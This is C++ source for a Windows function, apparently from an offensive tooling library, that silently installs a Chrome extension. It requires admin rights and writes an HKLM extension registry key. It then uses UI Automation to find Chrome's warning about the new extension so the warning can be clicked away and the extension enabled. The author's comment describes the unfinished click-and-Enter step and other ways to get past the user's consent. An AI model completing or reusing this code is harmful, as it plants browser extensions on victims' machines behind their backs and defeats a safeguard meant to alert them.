#include "Win32Helper.h"
#include <AtlBase.h>
#include <AtlCom.h>
#include <UIAutomation.h>

BOOL __unstable__preview__MpfSilentInstallGoogleChromePluginW(_In_ PWCHAR ExtensionIdentifier)
{
	WCHAR RegistryKeyPath[MAX_PATH] = L"SOFTWARE\\WOW6432Node\\Google\\Chrome\\Extensions\\";
	WCHAR UpdateUrl[MAX_PATH] = L"https://clients2.google.com/service/update2/crx";
	BOOL bFlag = FALSE;
	HKEY hKey = NULL;
	INT Length = 0;
	DWORD dwError = ERROR_SUCCESS;
	HRESULT Result = ERROR_SUCCESS;
	HWND hChrome = NULL;
	IUIAutomation* Automaton = NULL;
	IUIAutomationElement* Element = NULL;
	IUIAutomationCondition* Condition = NULL;
	IUIAutomationElementArray* Array = NULL;
	IUIAutomationElement* Pane = NULL;

	if (!IsProcessRunningAsAdmin()) //admin required
		goto EXIT_ROUTINE;

	if (StringConcatW(RegistryKeyPath, ExtensionIdentifier) == NULL)
		goto EXIT_ROUTINE;

	dwError = IsRegistryKeyValidW(HKEY_LOCAL_MACHINE, RegistryKeyPath);
	if (dwError == ERROR_SUCCESS) //already installed
		goto EXIT_ROUTINE; 

	if (dwError != ERROR_FILE_NOT_FOUND) //other error occurred
		goto EXIT_ROUTINE;

	dwError = ERROR_SUCCESS;

	Result = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (!SUCCEEDED(Result))
		goto EXIT_ROUTINE;

	for (;;)
	{
		WCHAR Buffer[MAX_PATH * sizeof(WCHAR)] = { 0 };

		if (!GetProcessBinaryNameFromHwndW(GetForegroundWindow(), Buffer, MAX_PATH * sizeof(WCHAR)))
			continue;

		if (StringFindSubstringW(Buffer, (PWCHAR)L"chrome.exe") != NULL)
			break;
	}

	hChrome = FindWindowExW(NULL, hChrome, L"Chrome_WidgetWin_1", NULL);
	if (hChrome == NULL)
		goto EXIT_ROUTINE;

	Result = CoCreateInstance(CLSID_CUIAutomation, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&Automaton));
	if (!SUCCEEDED(Result))
		goto EXIT_ROUTINE;

	if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, RegistryKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS)
		goto EXIT_ROUTINE;

	if(RegSetValueExW(hKey, L"update_url", 0, REG_SZ, (PBYTE)UpdateUrl, (DWORD)StringLengthW(UpdateUrl) * sizeof(WCHAR)) != ERROR_SUCCESS)
		goto EXIT_ROUTINE;

	Result = Automaton->ElementFromHandle(hChrome, &Element);
	if (!SUCCEEDED(Result))
		goto EXIT_ROUTINE;

	Result = Automaton->CreatePropertyCondition(UIA_ControlTypePropertyId, CComVariant(UIA_ToolBarControlTypeId), &Condition);
	if (!SUCCEEDED(Result))
		goto EXIT_ROUTINE;

	Result = Element->FindAll(TreeScope_Descendants, Condition, &Array);
	if (!SUCCEEDED(Result))
		goto EXIT_ROUTINE;

	Array->get_Length(&Length);
	for (INT i = 0; i < Length; i++)
	{
		CComBSTR NameObject;
		IUIAutomationElementArray* ccArray = NULL;
		INT ccLength = 0;

		Result = Array->GetElement(i, &Pane);
		if (!SUCCEEDED(Result))
			goto EXIT_ROUTINE;

		Result = Automaton->CreatePropertyCondition(UIA_ControlTypePropertyId, CComVariant(UIA_MenuItemControlTypeId), &Condition);
		if (!SUCCEEDED(Result))
			goto EXIT_ROUTINE;

		Result = Pane->FindAll(TreeScope_Descendants, Condition, &ccArray);
		if (!SUCCEEDED(Result))
			goto EXIT_ROUTINE;

		ccArray->get_Length(&ccLength);
		for (INT y = 0; y < ccLength; y++)
		{
			CComBSTR ccNameObject;
			Result = ccArray->GetElement(y, &Pane);
			if (!SUCCEEDED(Result))
				goto EXIT_ROUTINE;

			Pane->get_CurrentName(&ccNameObject);
			if (!SUCCEEDED(Result))
				goto EXIT_ROUTINE;

			if (StringCompareW(ccNameObject, L"Error") == ERROR_SUCCESS)
			{
				Pane->SetFocus(); //< ------ - ERROR MESSAGE IS HERE, NEED TO SEND CLICK AND ENUM AND ENTER
				//finish me
			}
		}

		if (ccArray)
			ccArray->Release();

		if(Pane)
			Pane->Release();
	}

	bFlag = TRUE;

	//		This code causes Chrome to display an error, it alerts the user
	//		that a new chrome extension has been silently installed. It
	//		asks the user whether or not they'd like to enable it, disable it,
	//		or remove it. The goal now is to use the IUIAutomation API to
	//		programmatically enable the plugin. The code bottom is borrowed
	//		from the other functionality present in MpfComMonitorChromeSessionOnce,
	//		which, although needs revision, is sufficient enough for this experimental
	//		code base. The code is currently commented out, but it is nearly
	//		complete. It successfully identifies the ERROR message thrown,
	//		it is able to SetFocus and find the text. All that remains is
	//		getting the POINT structure, filling it, automating a click, and then
	//		sending the ENTER command as SENDINPUT, to enable the script. This
	//		method is unorthodox, and may be prone to errors as it relies on the
	//		chrome being open at the time the extension is installed. Other methods
	//		need to be discovered to silently install extensions. 
	//		An alternative method is Chrome native messaging, or reverse engineering
	//		chrome plugin DB files in %LOCALAPPDATA% to determine how to enable
	//		it without having to interface with chrome or the IUI
	//
	//		-smelly, November 13th, 2022
	//		P.S. Memory leaks may be present in the nested FOR loop statement when
	//		traversing chromes pane and menu bar. :P

EXIT_ROUTINE:
	
	if (Pane)
		Pane->Release();

	if (Array)
		Array->Release();

	if (Element)
		Element->Release();

	if (Automaton)
		Automaton->Release();

	CoUninitialize();

	if (hKey)
		RegCloseKey(hKey);

	return bFlag;
}

BOOL __unstable__preview__MpfSilentInstallGoogleChromePluginA(_In_ PCHAR ExtensionIdentifier)
{
	return FALSE;
}